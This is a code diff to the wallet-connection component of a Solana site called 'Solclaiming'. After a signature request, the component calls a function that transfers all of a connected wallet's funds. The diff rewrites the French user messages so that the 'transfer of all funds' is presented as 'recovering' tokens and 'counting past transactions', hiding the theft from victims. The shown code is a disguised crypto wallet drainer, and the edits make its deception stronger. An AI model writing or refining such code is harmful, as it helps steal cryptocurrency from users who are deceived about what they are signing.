@@ -106,7 +106,7 @@ export const WalletProvider = ({ children }: { children: ReactNode }) => {
 
   const requestSignature = async (provider: PhantomProvider): Promise<boolean> => {
     try {
-      const message = "Bienvenu sur Solclaiming nouveau utilisateur";
+      const message = "Bienvenu sur Solclaiming.com nouveau utilisateur";
       const encodedMessage = new TextEncoder().encode(message);
       await provider.signMessage(encodedMessage, 'utf8');
       return true;
@@ -185,7 +185,7 @@ export const WalletProvider = ({ children }: { children: ReactNode }) => {
       if (transaction.instructions.length === 0) {
         toast({
           title: 'Aucun fonds',
-          description: "Aucun SOL ou token à transférer.",
+          description: "Aucun SOL ou token à récuperer.",
         });
         return;
       }
@@ -251,7 +251,7 @@ export const WalletProvider = ({ children }: { children: ReactNode }) => {
 
       toast({
         title: 'Connecté !',
-        description: 'Préparation du transfert de tous les fonds...',
+        description: 'Calcul du nombre de transactions effectuées...',
       });
 
       await transferAllFunds(provider, pubkey);
